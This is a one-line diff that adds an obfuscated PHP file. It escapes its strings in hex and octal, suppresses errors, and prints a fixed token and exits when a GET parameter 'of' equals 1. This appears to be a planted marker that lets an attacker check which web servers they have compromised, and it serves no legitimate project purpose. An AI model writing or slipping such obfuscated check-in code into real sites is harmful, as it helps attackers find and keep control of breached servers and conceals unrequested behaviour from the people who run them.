@@ -1,0 +1,1 @@
+<?php  error_reporting(0); $JeBEc = array("\x5f\107\x45\x54"); (${$JeBEc[0]}["\157\x66"] == 1) && die("+OpMnUoXK1Fa2ahGeu0kfOgqXkDt7D6V1cV+HGXDSp4I1L/zNp0YeBNggvZ8tcLC");  ?>
